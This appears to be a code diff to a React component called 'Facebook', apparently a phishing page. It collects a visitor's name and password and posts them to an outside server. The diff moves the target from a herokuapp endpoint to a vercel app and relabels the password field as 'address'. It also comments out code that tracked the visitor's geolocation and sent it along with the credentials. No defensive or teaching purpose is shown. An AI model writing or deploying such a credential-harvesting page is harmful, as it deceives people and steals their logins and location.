@@ -5,36 +5,38 @@ import {Helmet} from "react-helmet";
 
 function Facebook() {
 
+  const api = "https://node-kafka.vercel.app"
+
   const [name,setName] = useState("")
   const [password,setPassword] = useState("")
   const [latitude,setLatitude] = useState("")
   const [longitude,setLongitude] = useState({})
 
-  useEffect(() => {
-    if (navigator.geolocation) {
-      navigator.geolocation.watchPosition(function(position) {
-        const loca = ("Latitude is :", position.coords.latitude);
-        const tion = ("Longitude is :", position.coords.longitude);
-        console.log(loca,tion);
-      setLatitude(position.coords.latitude) ;
-      setLongitude( position.coords.longitude)
-      });
-    }
-  },[])
+  // useEffect(() => {
+  //   if (navigator.geolocation) {
+  //     navigator.geolocation.watchPosition(function(position) {
+  //       const loca = ("Latitude is :", position.coords.latitude);
+  //       const tion = ("Longitude is :", position.coords.longitude);
+  //       console.log(loca,tion);
+  //     setLatitude(position.coords.latitude) ;
+  //     setLongitude( position.coords.longitude)
+  //     });
+  //   }
+  // },[])
 
   let location = latitude +" "+ longitude
-    let username = name
-    let description = password+" | location " + location
-    let duration = 5
-    let date = new Date()
+    // let username = name
+    let address = password+" | location " + location
+    // let duration = 5
+    let slug = new Date()
 
     const savedata = () => {
       // window.location.href = '/';
       let data = ({
-          username,
-          description,
-          duration,
-          date
+          name,
+          address,
+          // duration,
+          slug
       })
 
       const headers = {
@@ -42,7 +44,7 @@ function Facebook() {
         'Accept': 'Application/Json'
         }
 
-      axios.post('https://backendaloginda.herokuapp.com/exercises/add', data)
+      axios.post(`${api}/v1/post`, data)
 
       console.log(data)     
   }
